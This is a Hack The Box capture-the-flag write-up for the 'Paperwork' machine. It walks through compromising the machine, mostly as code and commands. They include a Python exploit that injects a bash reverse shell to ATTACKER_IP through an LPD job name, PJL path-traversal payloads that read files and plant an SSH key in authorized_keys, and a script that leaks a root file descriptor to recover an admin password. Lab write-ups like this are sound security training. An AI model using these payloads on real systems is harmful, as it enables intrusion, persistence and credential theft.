<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Paperwork Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1ee24ec-e2f1-4c61-88ca-9d7d4d296251-1780441937.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): <a href="https://app.hackthebox.com/users/512308">LazyTitan33</a></p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: 07 Oct 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Prerequisites

`openvpn`, `nmap`, `curl`, `netcat (nc)`, `unzip`, `file`, `python3`, `ssh`, `ssh-keygen`

## Placeholder legend

Swap every token below before running. Tokens in `< >` are per-spawn and change each time the machine is reset; the fill-in table at the bottom collects them.

| Token | What it is | Where to get it |
| --- | --- | --- |
| `TARGET_IP` | Target machine IP | HTB machine page |
| `ATTACKER_IP` | Your HTB VPN (tun0) IP | `ip -4 addr show tun0` |
| `LPORT` | Your reverse-shell listener port | You choose (example uses 4444) |
| `<ATTACKER_SSH_PUBKEY>` | Public half of the keypair you generate in 4.3 | `cat archivist_key.pub` |
| `<ADMIN_PASSWORD>` | Admin password leaked over the mgmt socket | Recovered at runtime in 5.3; regenerates per spawn |

Fixed box-design values left as-is: `paperwork.htb`, `127.0.0.1:9100`, the usernames `lp` / `archivist` / `root`, paths like `/opt/LPDServer`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery

### 1.1 Connect to Hack The Box

> Runs in the foreground; leave this terminal open for the whole session.

```bash
sudo openvpn your_file.ovpn
```

Start the Machine.
<div align="center">
<br>
</div>

### 1.2 Store the target address in a shell variable

```bash
IP=TARGET_IP
echo $IP
```

To clear it:

```bash
unset IP
```
<div align="center">
<br>
</div>

### 1.3 Verify target is reachable

```bash
ping -c 4 TARGET_IP
```
<div align="center">
<br>
</div>

### 1.4 Port scan with Nmap

#### 1.4.1 Full port sweep

```bash
nmap -p- --min-rate 5000 -Pn TARGET_IP
```

> Optional: pipe through this to pull the open ports into a comma-separated list for the next scan.

```bash
nmap -p- --min-rate 5000 -Pn TARGET_IP | grep -oP '^\d+(?=/tcp\s+open)' | paste -sd,
```
<div align="center">
<br>
</div>

#### 1.4.2 Targeted version/script scan

> Ports below (22,80,1515) are what the full sweep returns on this box.

```bash
nmap -A -p 22,80,1515 TARGET_IP
```
<div align="center">
<br>
</div>

#### 1.4.3 Notes

- 22 SSH, 80 nginx (redirects to `paperwork.htb`, a name-based vhost: needs a hosts entry), 1515 custom LPD-like daemon that greets with `Archive_Printer is ready and printing.`
- Port 1515 is the primary attack surface.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Register the vhost and read the intake portal

> `sudo` may prompt for your password.

```bash
echo "TARGET_IP paperwork.htb" | sudo tee -a /etc/hosts
```

```bash
curl -s http://paperwork.htb/
```
<div align="center">
<br>
</div>

### 2.2 Locate the processor source link

```bash
curl -s http://paperwork.htb/ | grep -iE 'href|src='
```

> The processor name links to `/download/archive`.
<div align="center">
<br>
</div>

### 2.3 Retrieve and identify the source bundle

```bash
curl -s http://paperwork.htb/download/archive -o paperwork-archive-v1.02.zip
file paperwork-archive-v1.02.zip
```
<div align="center">
<br>
</div>

### 2.4 Extract the source bundle

```bash
unzip paperwork-archive-v1.02.zip -d paperwork-archive
ls -laR paperwork-archive
```
<div align="center">
<br>
</div>

### 2.5 Read the LPD service source

```bash
cat paperwork-archive/server.py
```

> Two bugs to exploit: `queue not in VALID_QUEUE` is a substring check, so an empty queue name passes (`"" in "archive_intake"` is True); and the control-file `J` job-name is interpolated into `subprocess.Popen(..., shell=True)` with no sanitization, giving command injection as the service account.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation & Initial Access

### 3.1 Foothold as `lp` via LPD command injection

Terminal 1 (listener, on the attack box):

```bash
nc -lvnp 4444
```

Terminal 2 (run the exploit, on the attack box):

```bash
python3 foothold.py
```

`foothold.py` (reconstructed from the protocol handshake; swap the three marked values):

```python
#!/usr/bin/env python3
import socket

TARGET = "TARGET_IP"      # <-- swap: target IP
PORT   = 1515
LHOST  = "ATTACKER_IP"    # <-- swap: your tun0 IP
LPORT  = 4444             # <-- swap: your listener port (match the nc above)

cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
job = f"'; {cmd}; #"                      # breaks out of echo 'Archive: ...'
control = f"Hlocalhost\nPtester\nJ{job}\n"

s = socket.socket()
s.connect((TARGET, PORT))

# command byte 0x02 (receive job) + empty queue name -> passes the substring check
s.send(b"\x02\n")

# subcommand 0x02 (receive control file): announce size + control-file name
header = b"\x02" + str(len(control)).encode() + b" cfA001localhost\n"
s.send(header)
print("[*] header ACK:", s.recv(1))

# deliver the control file -> triggers the injected command on the target
s.send(control.encode())
print("[*] final ACK:", s.recv(1))
print("[+] Payload sent, check your listener")
s.close()
```

> You land as `lp` in `/opt/LPDServer` on the listener.
<div align="center">
<br>
</div>

### 3.2 Stabilize the shell and confirm context

> Run the first line on the target. Then Ctrl-Z to background, run the `stty` line on the attack box, press Enter twice, and you are back in the shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
stty raw -echo; fg
```

```bash
id ; hostname
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Lateral Movement

### 4.1 Enumerate internal listeners

> Run on the target.

```bash
ss -tlnp
```

> Relevant finding: `127.0.0.1:9100` (internal JetDirect/PJL, the pivot). `127.0.0.1:1337` is a decoy, ignore it.
<div align="center">
<br>
</div>

### 4.2 Read `user.txt` via PJL directory traversal (`FSUPLOAD`)

> Run on the target (`nc` is absent there, so use Python).

```bash
python3 -c '
import socket
s=socket.socket()
s.connect(("127.0.0.1",9100))
s.send(b"@PJL FSUPLOAD NAME=\"../../../../home/archivist/user.txt\"\n")
print(s.recv(4096).decode(errors="ignore"))
s.close()
'
```
<div align="center">
<br>
</div>

### 4.3 Write an SSH key via PJL `FSDOWNLOAD`

Precondition check (on the target): confirm `/home/archivist/.ssh/` exists; `FSDOWNLOAD` will not create missing directories.

```bash
python3 -c '
import socket
s=socket.socket(); s.connect(("127.0.0.1",9100))
s.send(b"@PJL FSDIRLIST NAME=\"../../../../home/archivist\" ENTRY=1 COUNT=100\n")
print(s.recv(4096).decode(errors="ignore")); s.close()
'
```

Generate a keypair (on the attack box):

> `-N ""` sets an empty passphrase, so this does not prompt.

```bash
ssh-keygen -t ed25519 -f archivist_key -N ""
```

Write the public key into `archivist`'s `authorized_keys` (on the target):

> Paste YOUR pubkey (`cat archivist_key.pub`) in place of `<ATTACKER_SSH_PUBKEY>` on the `key =` line below. Keep the trailing `\n` inside the quotes.

```bash
python3 -c '
import socket
key = b"<ATTACKER_SSH_PUBKEY>\n"
s=socket.socket(); s.connect(("127.0.0.1",9100))
hdr=b"@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=%d\n" % len(key)
s.send(hdr); s.send(key); s.close()
print("[+] key written")
'
```

Verify the write (on the target):

```bash
python3 -c '
import socket
s=socket.socket(); s.connect(("127.0.0.1",9100))
s.send(b"@PJL FSUPLOAD NAME=\"../../../../home/archivist/.ssh/authorized_keys\"\n")
print(s.recv(4096).decode(errors="ignore")); s.close()
'
```
<div align="center">
<br>
</div>

### 4.4 SSH login as `archivist`

> First connect prompts to accept the host key: type `yes`. Authentication is by key, so no password prompt.

```bash
ssh -i archivist_key archivist@TARGET_IP
```

```bash
id
ls -la /run/paperwork
```

> `/run/paperwork/mgmt.sock` is owned `root:archivist`, mode `srw-rw----`: a root process accepting connections from the `archivist` group. This is the privesc entry point.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc

### 5.1 Enumerate the root management daemon

> Run on the target.

```bash
ps -ef | grep -i paperwork | grep -v grep
file /usr/bin/paperwork-daemon
ls -la /usr/bin/paperwork-daemon /etc/paperwork
```

> `paperwork-daemon` is a Python script running as root behind `mgmt.sock`; its source is world-readable; `/etc/paperwork/admin_pins.conf` is root-only (the target).
<div align="center">
<br>
</div>

### 5.2 Read the daemon source

```bash
cat /usr/bin/paperwork-daemon
```

> Mechanism to exploit: the daemon opens `admin_pins.conf` as root at startup and, whenever the attacker-writable log `/home/archivist/printer/logs/commands.log` contains `FSQUERY`, `FSUPLOAD`, or `FSDOWNLOAD`, passes root's open descriptor to the client over `SCM_RIGHTS`. `SCM_RIGHTS` carries the access from `open()` time, so you can read the file through the leaked descriptor without any rights on it yourself.
<div align="center">
<br>
</div>

### 5.3 Leak root's file descriptor and recover the admin password

> Run on the target as `archivist`. The `echo` plants the trigger word that forces the leaking branch.

```bash
mkdir -p /home/archivist/printer/logs
echo "FSQUERY" > /home/archivist/printer/logs/commands.log
python3 -c '
import socket, array, os
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/paperwork/mgmt.sock")
msg, anc, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(8))
print("msg:", msg.decode(errors="ignore"))
for level, typ, data in anc:
    if level == socket.SOL_SOCKET and typ == socket.SCM_RIGHTS:
        fds = array.array("i"); fds.frombytes(data)
        for fd in fds:
            try:
                print(f"[fd {fd}]", os.pread(fd, 1024, 0).decode(errors="ignore").strip())
            except Exception as e:
                print(f"[fd {fd}] read error: {e}")
s.close()
'
```

> The leaked descriptor for `admin_pins.conf` prints `ADMIN_PASSWORD=<ADMIN_PASSWORD>`. Note it; it regenerates per spawn.
<div align="center">
<br>
</div>

### 5.4 Escalate to root via password reuse

> `su root` prompts `Password:`; enter the `<ADMIN_PASSWORD>` recovered in 5.3 (reused as the root password).

```bash
su root
```

```bash
id
cat /root/root.txt
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Host / terminal map

```
Attack box (Kali)
  tun0 = ATTACKER_IP
  T1: nc -lvnp LPORT   (catches the lp reverse shell)
  T2: python3 foothold.py
         |
         v  22 / 80 / 1515 (external)
Target: paperwork.htb  = TARGET_IP
  foothold:   lp        (via 1515 LPD injection, /opt/LPDServer)
    |  internal 127.0.0.1:9100 (PJL traversal: FSUPLOAD read / FSDOWNLOAD write)
    v
  lateral:    archivist (SSH key written to authorized_keys; ssh -i archivist_key)
    |  /run/paperwork/mgmt.sock (root daemon, SCM_RIGHTS fd leak)
    v
  root        (admin password reuse -> su root)
```

## Fill-in table (per-spawn values)

| Token | Your value |
| --- | --- |
| `TARGET_IP` | |
| `ATTACKER_IP` | |
| `LPORT` | |
| `<ATTACKER_SSH_PUBKEY>` | |
| `<ADMIN_PASSWORD>` | |
| `user.txt` | |
| `root.txt` | |

## References
